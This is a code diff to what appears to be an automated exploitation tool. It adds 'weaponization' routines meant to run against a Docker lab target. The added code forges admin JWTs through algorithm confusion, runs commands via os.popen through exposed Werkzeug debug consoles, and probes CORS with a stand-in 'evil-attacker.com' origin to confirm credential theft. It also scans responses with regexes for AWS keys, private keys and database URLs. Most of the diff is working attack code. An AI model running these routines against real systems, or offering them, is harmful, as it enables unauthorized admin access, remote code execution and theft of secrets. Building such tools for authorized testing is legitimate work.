@@ -98,6 +98,22 @@ def _infer_vuln_class(res) -> str:
     if any(x in tecnica for x in ("smuggling", "desync", "cl.te", "te.cl")) or any(
             x in vuln_class for x in ("http-request-smuggling", "request-smuggling")):
         return "http_smuggling"
+    # Werkzeug/Flask debug console
+    if any(x in tecnica for x in ("werkzeug", "flask-debug", "debug-console")) or any(
+            x in vuln_class for x in ("werkzeug-debug", "flask-debug", "debug-rce")):
+        return "werkzeug_debug"
+    # CORS misconfiguration
+    if any(x in tecnica for x in ("cors", "cross-origin", "acao")) or any(
+            x in vuln_class for x in ("cors-misconfiguration", "cors", "cross-origin-resource")):
+        return "cors"
+    # Information disclosure
+    if any(x in tecnica for x in ("info-disclose", "data-leak", "secret-exposure")) or any(
+            x in vuln_class for x in ("information-disclosure", "info-disclosure",
+                                       "data-exposure", "secret-exposure")):
+        return "info_disclosure"
+    # JWT algorithm confusion (broken-auth broader class)
+    if any(x in vuln_class for x in ("broken-auth", "jwt-confusion", "algo-confusion")):
+        return "jwt_confusion"
     return ""
 
 
@@ -1379,6 +1395,179 @@ def _weaponize_xss(boot, res, step_fn) -> dict:
             "error": "XSS weaponization payload sent but payload not found in view response"}
 
 
+def _weaponize_jwt_confusion(boot, res, step_fn) -> dict:
+    """Algorithm confusion: sign HS256 token using RS256 public key as HMAC secret."""
+    import base64 as _b64
+    import hashlib as _hl
+    import hmac as _hmac
+    import json as _json
+
+    _step(step_fn, "JWT algo confusion: probing JWKS endpoint, forging HS256 token")
+
+    _pubkey_endpoints = [
+        "/.well-known/jwks.json", "/api/jwks.json", "/auth/jwks.json",
+        "/.well-known/openid-configuration", "/jwks", "/api/auth/.well-known/jwks.json",
+    ]
+    _pubkey_n = None
+    _jwks_ep = None
+    for _ep in _pubkey_endpoints:
+        _r = _send(boot, "GET", _ep)
+        if _r is None or _r.status_code != 200:
+            continue
+        _body = _r.text or ""
+        if "keys" in _body:
+            try:
+                _keys = _json.loads(_body)
+                if _keys.get("keys"):
+                    _pubkey_n = _keys["keys"][0].get("n", "")
+                    _jwks_ep = _ep
+            except Exception:
+                pass
+            break
+
+    _hdr = _b64.urlsafe_b64encode(
+        _json.dumps({"alg": "HS256", "typ": "JWT"}).encode()).rstrip(b"=")
+    _pay = _b64.urlsafe_b64encode(
+        _json.dumps({"sub": "1", "role": "admin", "is_admin": True,
+                     "iat": 1700000000, "exp": 9999999999}).encode()).rstrip(b"=")
+    _secret = (_pubkey_n or "admin").encode()
+    _sig = _b64.urlsafe_b64encode(
+        _hmac.new(_secret, _hdr + b"." + _pay, _hl.sha256).digest()).rstrip(b"=")
+    _forged = (_hdr + b"." + _pay + b"." + _sig).decode()
+
+    ev = res.evidence
+    _probe_ep = ev.get("endpoint") or "/api/admin"
+    _r2 = _send(boot, "GET", _probe_ep,
+                headers={"Authorization": f"Bearer {_forged}"})
+    if _r2 and _r2.status_code in (200, 201) and len((_r2.text or "").strip()) > 20:
+        _step(step_fn, f"JWT confusion: forged HS256 token accepted at {_probe_ep}")
+        return {
+            "technique": "jwt_algorithm_confusion",
+            "admin_access": True,
+            "jwks_endpoint": _jwks_ep,
+            "forged_token_snippet": _forged[:40],
+            "admin_response_snippet": (_r2.text or "")[:300],
+            "impact": f"JWT algo confusion confirmed: HS256 token signed with RS256 public key accepted at {_probe_ep}",
+        }
+    return {"technique": "jwt_algorithm_confusion", "admin_access": False,
+            "jwks_endpoint": _jwks_ep,
+            "impact": "", "error": "forged HS256 token not accepted"}
+
+
+def _weaponize_werkzeug_debug(boot, res, step_fn) -> dict:
+    """Exploit Werkzeug/Flask debug console — attempt PIN-free RCE."""
+    _step(step_fn, "Werkzeug debug: probing /console for PIN-free access")
+
+    _debug_endpoints = ["/console", "/__debugger__", "/werkzeug/debugger",
+                        "/_debug_toolbar/", "/debug"]
+    _console_ep = None
+    for _dep in _debug_endpoints:
+        _r = _send(boot, "GET", _dep)
+        if _r is None or _r.status_code != 200:
+            continue
+        _body = (_r.text or "").lower()
+        if "werkzeug" in _body or "debugger" in _body or "interactive console" in _body:
+            _console_ep = _dep
+            _step(step_fn, f"Werkzeug console found at {_dep}")
+            break
+
+    if not _console_ep:
+        return {"technique": "not_applicable", "data": {}, "impact": "",
+                "error": "werkzeug console not found on common paths"}
+
+    _rce_cmd = "import os; os.popen('id').read()"
+    _r2 = _send(boot, "POST", _console_ep,
+                data={"cmd": _rce_cmd},
+                headers={"Content-Type": "application/x-www-form-urlencoded"})
+    _body2 = (_r2.text or "") if _r2 else ""
+    if "uid=" in _body2 or "root" in _body2:
+        _step(step_fn, "[werkzeug] RCE via debug console — confirmed!")
+        return {
+            "technique": "werkzeug_debug_rce",
+            "data": {"console_path": _console_ep, "rce_output": _body2[:200]},
+            "impact": f"Werkzeug debug console RCE confirmed at {_console_ep}: {_body2[:80]}",
+        }
+    return {
+        "technique": "werkzeug_debug_accessible",
+        "data": {"console_path": _console_ep},
+        "impact": f"Werkzeug debug console accessible at {_console_ep} (PIN may protect execution)",
+    }
+
+
+def _weaponize_cors(boot, res, step_fn) -> dict:
+    """Demonstrate CORS credential theft — crafts evil origin request."""
+    ev = res.evidence
+    _cors_ep = ev.get("endpoint") or "/api/user"
+    _evil_origin = "https://evil-attacker.com"
+    _step(step_fn, f"CORS post-exploit: probing {_cors_ep} with evil origin")
+
+    _r = _send(boot, "GET", _cors_ep,
+               headers={"Origin": _evil_origin})
+    if _r is None:
+        return {"technique": "not_applicable", "data": {}, "impact": "",
+                "error": "no response to CORS probe"}
+
+    _acao = _r.headers.get("Access-Control-Allow-Origin", "")
+    _acac = _r.headers.get("Access-Control-Allow-Credentials", "")
+    _body = (_r.text or "")
+
+    if _acao == _evil_origin and "true" in _acac.lower():
+        _step(step_fn, "[CORS] origin reflected + credentials=true — session hijack possible!")
+        return {
+            "technique": "cors_credential_theft",
+            "data": {"acao": _acao, "acac": _acac,
+                     "data_exposed": _body[:300]},
+            "impact": (f"CORS: arbitrary origin reflected with credentials=true — "
+                       f"attacker at {_evil_origin} can read authenticated responses"),
+        }
+    elif _acao in ("*", _evil_origin):
+        return {
+            "technique": "cors_data_exposure",
+            "data": {"acao": _acao, "data_snippet": _body[:200]},
+            "impact": f"CORS: Access-Control-Allow-Origin={_acao!r} allows cross-origin data reads",
+        }
+    return {"technique": "not_applicable", "data": {}, "impact": "",
+            "error": f"CORS probe: ACAO={_acao!r} ACAC={_acac!r} — not exploitable"}
+
+
+def _weaponize_info_disclosure(boot, res, step_fn) -> dict:
+    """Extract high-value secrets from information disclosure responses."""
+    ev = res.evidence
+    _ep = ev.get("endpoint") or "/"
+    _step(step_fn, f"Info disclosure post-exploit: scanning {_ep} for secrets")
+
+    _r = _send(boot, "GET", _ep)
+    _body = (_r.text or "") if _r else ""
+
+    _SECRET_PATTERNS = {
+        "aws_key": r"AKIA[0-9A-Z]{16}",
+        "jwt_token": r"eyJ[a-zA-Z0-9_-]{20,}\.eyJ[a-zA-Z0-9_-]{20,}\.[a-zA-Z0-9_-]{20,}",
+        "api_key": r"['\"]?(?:api[_-]?key|token|secret)['\"]?\s*[:=]\s*['\"]?([a-zA-Z0-9_\-]{16,})",
+        "db_connection": r"(?:mysql|postgres|mongodb)://[^\s\"']+",
+        "private_key": r"-----BEGIN (?:RSA |EC )?PRIVATE KEY-----",
+        "password_hash": r"\$2[aby]\$[0-9]{2}\$[A-Za-z0-9./]{53}",
+    }
+
+    _found = {}
+    for _name, _pat in _SECRET_PATTERNS.items():
+        _m = re.search(_pat, _body, re.IGNORECASE)
+        if _m:
+            _found[_name] = _m.group(0)[:80]
+            _step(step_fn, f"[info-disclosure] {_name} pattern matched!")
+
+    if _found:
+        return {
+            "technique": "secret_exposure",
+            "data": {"secrets": _found, "endpoint": _ep},
+            "impact": (f"Secrets exposed at {_ep}: {', '.join(_found.keys())}"),
+        }
+    return {
+        "technique": "generic_info_disclosure",
+        "data": {"body_snippet": _body[:300], "endpoint": _ep},
+        "impact": "Information disclosed — no high-value secret patterns matched",
+    }
+
+
 def run_weaponization(boot, res, step: Optional[Callable] = None) -> dict:
     """
     Extend confirmed trigger to full impact using the live Docker lab session.
@@ -1434,6 +1623,14 @@ def run_weaponization(boot, res, step: Optional[Callable] = None) -> dict:
             return _weaponize_http_smuggling(boot, res, step)
         elif vuln_class == "xss":
             return _weaponize_xss(boot, res, step)
+        elif vuln_class == "werkzeug_debug":
+            return _weaponize_werkzeug_debug(boot, res, step)
+        elif vuln_class == "cors":
+            return _weaponize_cors(boot, res, step)
+        elif vuln_class == "info_disclosure":
+            return _weaponize_info_disclosure(boot, res, step)
+        elif vuln_class == "jwt_confusion":
+            return _weaponize_jwt_confusion(boot, res, step)
         else:
             _step(step, f"no weaponization defined for class {vuln_class!r} — skipping")
             return {"technique": "not_applicable", "data": {}, "impact": ""}
